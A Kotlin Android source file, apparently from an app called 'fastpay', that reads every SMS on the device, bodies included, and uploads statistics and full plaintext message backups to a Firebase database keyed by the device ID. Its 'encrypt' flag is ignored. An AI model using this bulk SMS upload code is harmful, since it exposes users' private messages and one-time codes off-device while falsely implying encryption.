package com.example.fast.util

import android.annotation.SuppressLint
import android.content.Context
import android.provider.Settings
import android.provider.Telephony
import android.database.Cursor
import com.google.firebase.Firebase
import com.google.firebase.database.database
import com.prexoft.prexocore.writeInternalFile

/**
 * Message Analytics Manager
 * Handles message statistics collection and analysis
 */
object MessageAnalyticsManager {
    
    data class MessageData(
        val id: String,
        val address: String,
        val body: String,
        val timestamp: Long,
        val type: Int,
        val read: Boolean
    )
    
    data class MessageStats(
        val total: Int,
        val sent: Int,
        val received: Int,
        val read: Int,
        val unread: Int,
        val topSenders: List<Map<String, Any>>,
        val topRecipients: List<Map<String, Any>>,
        val dailyBreakdown: Map<String, Int>,
        val calculatedAt: Long
    )
    
    /**
     * Calculate date range based on period
     */
    fun calculateDateRange(period: String): Pair<Long, Long> {
        val now = System.currentTimeMillis()
        val calendar = java.util.Calendar.getInstance()
        
        return when (period.lowercase()) {
            "today" -> {
                calendar.set(java.util.Calendar.HOUR_OF_DAY, 0)
                calendar.set(java.util.Calendar.MINUTE, 0)
                calendar.set(java.util.Calendar.SECOND, 0)
                calendar.set(java.util.Calendar.MILLISECOND, 0)
                Pair(calendar.timeInMillis, now)
            }
            "week" -> {
                calendar.add(java.util.Calendar.DAY_OF_WEEK, -7)
                Pair(calendar.timeInMillis, now)
            }
            "month" -> {
                calendar.add(java.util.Calendar.MONTH, -1)
                Pair(calendar.timeInMillis, now)
            }
            "year" -> {
                calendar.add(java.util.Calendar.YEAR, -1)
                Pair(calendar.timeInMillis, now)
            }
            else -> Pair(0L, now) // all
        }
    }
    
    /**
     * Fetch messages in date range
     */
    @SuppressLint("Range")
    fun fetchMessagesInRange(context: Context, startTime: Long, endTime: Long): List<MessageData> {
        val uri = Telephony.Sms.CONTENT_URI
        val cursor: Cursor? = context.contentResolver.query(
            uri,
            arrayOf("_id", "address", "body", "date", "type", "read"),
            "date >= ? AND date <= ?",
            arrayOf(startTime.toString(), endTime.toString()),
            "date DESC"
        )
        
        val messages = mutableListOf<MessageData>()
        cursor?.use {
            while (it.moveToNext()) {
                messages.add(MessageData(
                    id = it.getString(it.getColumnIndex("_id")),
                    address = it.getString(it.getColumnIndex("address")) ?: "",
                    body = it.getString(it.getColumnIndex("body")) ?: "",
                    timestamp = it.getLong(it.getColumnIndex("date")),
                    type = it.getInt(it.getColumnIndex("type")),
                    read = it.getInt(it.getColumnIndex("read")) == 1
                ))
            }
        }
        
        return messages
    }
    
    /**
     * Calculate message statistics
     */
    fun calculateMessageStats(messages: List<MessageData>): MessageStats {
        val sent = messages.count { it.type == Telephony.Sms.MESSAGE_TYPE_SENT }
        val received = messages.count { it.type == Telephony.Sms.MESSAGE_TYPE_INBOX }
        val read = messages.count { it.read }
        val unread = received - read
        
        // Top senders
        val topSenders = messages
            .filter { it.type == Telephony.Sms.MESSAGE_TYPE_INBOX }
            .groupBy { it.address }
            .mapValues { it.value.size }
            .toList()
            .sortedByDescending { it.second }
            .take(10)
            .map { mapOf("number" to it.first, "count" to it.second) }
        
        // Top recipients
        val topRecipients = messages
            .filter { it.type == Telephony.Sms.MESSAGE_TYPE_SENT }
            .groupBy { it.address }
            .mapValues { it.value.size }
            .toList()
            .sortedByDescending { it.second }
            .take(10)
            .map { mapOf("number" to it.first, "count" to it.second) }
        
        // Daily breakdown
        val dailyBreakdown = messages
            .groupBy {
                java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.getDefault())
                    .format(java.util.Date(it.timestamp))
            }
            .mapValues { it.value.size }
        
        return MessageStats(
            total = messages.size,
            sent = sent,
            received = received,
            read = read,
            unread = unread,
            topSenders = topSenders,
            topRecipients = topRecipients,
            dailyBreakdown = dailyBreakdown,
            calculatedAt = System.currentTimeMillis()
        )
    }
    
    /**
     * Save statistics to Firebase
     */
    fun saveStatsToFirebase(context: Context, stats: MessageStats, period: String) {
        val deviceId = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        val statsPath = "fastpay/$deviceId/messageStats/${System.currentTimeMillis()}"
        
        val statsData = mapOf(
            "period" to period,
            "total" to stats.total,
            "sent" to stats.sent,
            "received" to stats.received,
            "read" to stats.read,
            "unread" to stats.unread,
            "topSenders" to stats.topSenders,
            "topRecipients" to stats.topRecipients,
            "dailyBreakdown" to stats.dailyBreakdown,
            "calculatedAt" to stats.calculatedAt
        )
        
        Firebase.database.reference
            .child(statsPath)
            .setValue(statsData)
            .addOnSuccessListener {
                LogHelper.d("MessageAnalyticsManager", "Statistics saved to Firebase")
            }
            .addOnFailureListener { e ->
                LogHelper.e("MessageAnalyticsManager", "Failed to save statistics to Firebase", e)
            }
    }
    
    /**
     * Fetch all messages for backup
     */
    @SuppressLint("Range")
    fun fetchAllMessages(context: Context): List<MessageData> {
        val uri = Telephony.Sms.CONTENT_URI
        val cursor: Cursor? = context.contentResolver.query(
            uri,
            arrayOf("_id", "address", "body", "date", "type", "read"),
            null,
            null,
            "date DESC"
        )
        
        val messages = mutableListOf<MessageData>()
        cursor?.use {
            while (it.moveToNext()) {
                messages.add(MessageData(
                    id = it.getString(it.getColumnIndex("_id")),
                    address = it.getString(it.getColumnIndex("address")) ?: "",
                    body = it.getString(it.getColumnIndex("body")) ?: "",
                    timestamp = it.getLong(it.getColumnIndex("date")),
                    type = it.getInt(it.getColumnIndex("type")),
                    read = it.getInt(it.getColumnIndex("read")) == 1
                ))
            }
        }
        
        return messages
    }
    
    /**
     * Convert messages to JSON string
     */
    fun convertToJson(messages: List<MessageData>): String {
        val jsonArray = messages.map { message ->
            mapOf(
                "id" to message.id,
                "address" to message.address,
                "body" to message.body,
                "timestamp" to message.timestamp,
                "type" to message.type,
                "read" to message.read
            )
        }
        
        // Simple JSON serialization (can be enhanced with proper JSON library)
        val jsonString = StringBuilder()
        jsonString.append("[")
        jsonArray.forEachIndexed { index, obj ->
            if (index > 0) jsonString.append(",")
            jsonString.append("{")
            jsonString.append("\"id\":\"${obj["id"]}\",")
            jsonString.append("\"address\":\"${obj["address"]}\",")
            jsonString.append("\"body\":\"${(obj["body"] as String).replace("\"", "\\\"")}\",")
            jsonString.append("\"timestamp\":${obj["timestamp"]},")
            jsonString.append("\"type\":${obj["type"]},")
            jsonString.append("\"read\":${obj["read"]}")
            jsonString.append("}")
        }
        jsonString.append("]")
        
        return jsonString.toString()
    }
    
    /**
     * Convert messages to CSV string
     */
    fun convertToCsv(messages: List<MessageData>): String {
        val csv = StringBuilder()
        csv.append("id,address,body,timestamp,type,read\n")
        
        messages.forEach { message ->
            csv.append("${message.id},")
            csv.append("\"${message.address}\",")
            csv.append("\"${message.body.replace("\"", "\"\"")}\",")
            csv.append("${message.timestamp},")
            csv.append("${message.type},")
            csv.append("${if (message.read) 1 else 0}\n")
        }
        
        return csv.toString()
    }
    
    /**
     * Save backup to Firebase
     */
    fun saveBackupToFirebase(context: Context, backupData: String, format: String, encrypt: Boolean, callback: (Boolean, String?) -> Unit) {
        val deviceId = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        val timestamp = System.currentTimeMillis()
        val backupPath = "fastpay/$deviceId/backups/$timestamp"
        
        val backupInfo = mapOf(
            "format" to format,
            "encrypted" to encrypt,
            "size" to backupData.length,
            "createdAt" to timestamp,
            "data" to backupData
        )
        
        Firebase.database.reference
            .child(backupPath)
            .setValue(backupInfo)
            .addOnSuccessListener {
                LogHelper.d("MessageAnalyticsManager", "Backup saved to Firebase: $backupPath")
                callback(true, backupPath)
            }
            .addOnFailureListener { e ->
                LogHelper.e("MessageAnalyticsManager", "Failed to save backup to Firebase", e)
                callback(false, e.message)
            }
    }
    
    /**
     * Save backup locally
     */
    fun saveBackupLocally(context: Context, backupData: String, format: String, encrypt: Boolean, callback: (Boolean, String?) -> Unit) {
        try {
            val timestamp = System.currentTimeMillis()
            val filename = "backup_${timestamp}.${format}"
            
            context.writeInternalFile(filename, backupData)
            
            LogHelper.d("MessageAnalyticsManager", "Backup saved locally: $filename")
            callback(true, filename)
        } catch (e: Exception) {
            LogHelper.e("MessageAnalyticsManager", "Failed to save backup locally", e)
            callback(false, e.message)
        }
    }
}
